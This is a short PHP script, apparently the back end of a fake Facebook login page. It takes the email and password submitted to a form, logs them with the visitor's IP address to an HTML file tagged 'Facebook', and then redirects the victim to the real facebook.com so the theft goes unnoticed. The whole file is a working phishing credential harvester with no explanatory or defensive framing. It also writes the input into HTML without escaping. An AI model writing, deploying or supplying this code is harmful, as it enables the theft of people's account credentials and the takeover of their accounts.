<?php

$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("user77.html", "a+"); 
fwrite ($f, '<center> Email: [<b><font color="#0000FF">'.$email.'</font></b>] Password: [<b><font color="#FF0040">'.$pass.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>][Facebook]<br> </center>');
fclose($f);

header("Location: https://www.facebook.com");
?>